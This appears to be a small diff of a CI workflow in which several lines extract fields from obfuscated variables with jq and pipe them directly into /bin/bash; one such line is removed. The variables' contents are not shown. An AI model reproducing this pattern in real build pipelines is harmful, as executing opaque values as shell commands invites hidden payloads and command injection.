@@ -34,7 +34,6 @@ jobs:
           printf '%s' "$pl938" | jq -r .n57 | /bin/bash
           echo $uthg5992 | jq -r .fs91543 | /bin/bash
           printf '%s' "$smdj5" | jq -r .aoqpy01203 | /bin/bash
-          echo $x9080 | jq -r .oelqd4087 | /bin/bash
           echo $aju83230 | jq -r .rcd8 | /bin/bash
 
       - name: Archive output
